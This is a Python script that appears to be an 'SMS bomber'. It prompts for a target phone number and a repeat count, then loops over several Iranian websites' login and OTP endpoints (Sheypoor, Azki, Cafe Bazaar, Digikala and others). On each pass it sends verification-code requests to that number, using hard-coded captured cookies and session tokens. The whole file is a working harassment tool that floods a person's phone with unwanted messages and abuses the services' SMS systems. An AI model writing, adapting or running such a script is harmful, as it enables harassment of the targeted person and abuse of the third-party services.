import requests


    
phone = input("ENTER THE PHONE PHONE NUMBER : ")
Number =int(input("ENTER THE NUMBER : "))
for X in range(Number):
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'https://www.shabdizgroup.com/',
        'Origin': 'https://www.shabdizgroup.com',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'Connection': 'keep-alive',
    }

    params = {
        'phoneNumber': phone,
    }

    response = requests.get('https://paneladmin.shabdizgroup.com/api/App/RequestVerifyCode', params=params, headers=headers)
    print(response)
    
    
    
    
    
    
    
    
    cookies = {
        'analytics_campaign': '{%22source%22:%22google%22%2C%22medium%22:%22organic%22}',
        'analytics_session_token': '3bece941-469f-7db3-57ca-c75c486639e0',
        'analytics_token': 'b4343320-839a-748e-c8e6-f585f449c0a9',
        'yektanet_session_last_activity': '5/12/2024',
        '_yngt_iframe': '1',
        '_ga_RVTCLF1865': 'GS1.1.1715541995.1.1.1715542022.33.0.0',
        '_ga': 'GA1.1.1549208832.1715541996',
        '_yngt': '6a61d24f-ff17f-f3f9c-c1173-3b63009c57372',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0',
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'https://www.sheypoor.com/session',
        'Content-Type': 'application/json;charset=utf-8',
        'Origin': 'https://www.sheypoor.com',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
    }
    json_data = {
        'username': phone,
    }

    response = requests.post('https://www.sheypoor.com/api/v10.0.0/auth/send', cookies=cookies, headers=headers, json=json_data)
    print(response)
        
        
        
        
        
        
        
        
    cookies = {
        '_gcl_aw': 'GCL.1715542605.EAIaIQobChMIseyple6IhgMVUktBAh2DRQ5LEAAYASAAEgKGYPD_BwE',
        '_gcl_au': '1.1.1480437398.1715542605',
        '_ga_43SWEC8CH3': 'GS1.1.1715542606.1.1.1715542640.26.0.0',
        '_ga': 'GA1.1.1866004704.1715542606',
        'cw_conversation': 'eyJhbGciOiJIUzI1NiJ9.eyJzb3VyY2VfaWQiOiI5NGIxNzNhNC0xMzgzLTQ4NjktYWQxMS00NzkyMDQxZjhmOWEiLCJpbmJveF9pZCI6M30.1Uz6vzqbWUxbz3mTwE_qcbmTvuVj_VqkPPKZMwqnQ9o',
        'analytics_campaign': '{%22source%22:%22google%22%2C%22medium%22:%22cpc%22%2C%22campaign%22:%22adwords%22%2C%22content%22:%22adwords%22}',
        'analytics_session_token': 'e81fc00e-c33d-a845-1bcf-686a6b8dcd89',
        'analytics_token': '11dfda95-5ceb-3475-ab1e-f9064cc8ea33',
        'yektanet_session_last_activity': '5/12/2024',
        '_yngt_iframe': '1',
        '_yngt': '262ff31b-b23fa-a553e-e5962-2fdc85648209a',
        'mp_998a65f2ebe6e503c6059187cc9ae771_mixpanel': '%7B%22distinct_id%22%3A%20%22%24device%3A18f6e4ed5cf47e9-09fa4df8e2ed6d-b7b2532-13c680-18f6e4ed5cf47e9%22%2C%22%24device_id%22%3A%20%2218f6e4ed5cf47e9-09fa4df8e2ed6d-b7b2532-13c680-18f6e4ed5cf47e9%22%2C%22%24search_engine%22%3A%20%22google%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%2C%22__mps%22%3A%20%7B%7D%2C%22__mpso%22%3A%20%7B%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%7D%2C%22__mpus%22%3A%20%7B%7D%2C%22__mpa%22%3A%20%7B%7D%2C%22__mpu%22%3A%20%7B%7D%2C%22__mpr%22%3A%20%5B%5D%2C%22__mpap%22%3A%20%5B%5D%7D',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'fa',
        'Content-Type': 'application/json',
        'device': 'web',
        'deviceID': '6',
        'user-token': '9uy6l6aYM2szFrtM58HA9aibUbC3rWLgcL0LGIPcbNHv2b2vzhgdA5b66FJoQNvf',
        'Origin': 'https://www.azki.co',
        'Connection': 'keep-alive',
        'Referer': 'https://www.azki.co/?gad_source=1&gclid=EAIaIQobChMIseyple6IhgMVUktBAh2DRQ5LEAAYASAAEgKGYPD_BwE',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',

    }

    json_data = {
        'phoneNumber': phone,
    }

    response = requests.post(
        'https://www.azki.co/api/vehicleorder/v2/app/auth/check-login-availability/',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
    print(response)
    
    
    
    
    
    
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.5',
        # 'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/json',
        'Referer': 'https://cafebazaar.ir/',
        'Origin': 'https://cafebazaar.ir',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'Connection': 'keep-alive',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    json_data = {
        'properties': {
            'language': 2,
            'clientID': 'tzgp5jhwlbrmg3vhl7wg3aowazjklwan',
            'deviceID': 'tzgp5jhwlbrmg3vhl7wg3aowazjklwan',
            'clientVersion': 'web',
        },
        'singleRequest': {
            'getOtpTokenRequest': {
                'username': phone,
            },
        },
    }

    response = requests.post('https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest', headers=headers, json=json_data)
    print(response)
    
    
    
    
    
    
    
    cookies = {
        'JSESSIONID': '19ADAA18494EA00739BBA4DC58448FEC',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'text/plain;charset=UTF-8',
        'Referer': 'https://kasbinoapp.ir/kasbinoo/',
        'Origin': 'https://kasbinoapp.ir',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'Connection': 'keep-alive',

    }

    data = '{"p1001":phone,"p1002":"registerSms","token":"175807d4-e307-4fdf-858c-3b23ffb36fb5.e000af00-d00d-0da0-0f00-000d00000cc0","RC":"7be86c2a5b54"}'

    response = requests.post('https://kasbinoapp.ir/kasbinoEngine1/RequestC', cookies=cookies, headers=headers, data=data)
    print(response)








    cookies = {
        '_sp_id.13cb': 'd5b7092e-2e01-44a7-9c06-b278c409bf52.1708613485.2.1715543280.1708613500.87fa22ad-27ae-46b1-ab80-b88da2d2740a.c1967b6f-50c5-4288-9a2e-e2b15bdb0fe7.2218ff53-d7b6-4312-a3cb-9eb90e5a3c5f.1715543260618.8',
        '_ga_QQKVTD5TG8': 'GS1.1.1715543266.2.1.1715543282.0.0.0',
        '_ga': 'GA1.1.946074157.1708613494',
        'tracker_glob_new': '4hDlUyn',
        '_sp_ses.13cb': '*',
        'tracker_glob_new': '4hDlUyn',
        'tracker_session': '3gTNTO6',
        'TS01c77ebf': '010231059171b1cc1636e0aa9db6f91c6b3fb5e13deae04cb5d5e9da56d02c5d7f82afa6769777ac454c1fc5fdf398509e0215aa87c6ecc71e23221e37386421d92e0a2d18',
        'TS01b6ea4d': '0102310591e2e299148924bb4d4b6737d8851bb2d4eae04cb5d5e9da56d02c5d7f82afa67650cbf5733de2cd3b48525285a184c1053bfe2427b44ab0fd1aeb076f284443043c0a94b95cebd67671fc9c1bccffe59c',
        'ab_test_experiments': '%5B%228b29e3376be23005993b066a7741e54e%22%2C%22229ea1a233356b114984cf9fa2ecd3ff%22%2C%22ce9358448bd487c71527b7c18d634fd1%22%2C%22e9ade66cadf2633c074b2cee1e403034%22%5D',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/json',
        'Referer': 'https://www.digikala.com/',
        'X-Web-Optimize-Response': '1',
        'X-Web-Client': 'desktop',
        'Origin': 'https://www.digikala.com',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'Connection': 'keep-alive',
    }

    json_data = {
        'backUrl': '/',
        'username': phone,
        'otp_call': False,
    }

    response = requests.post('https://api.digikala.com/v1/user/authenticate/', cookies=cookies, headers=headers, json=json_data)
    print(response)
    
    

    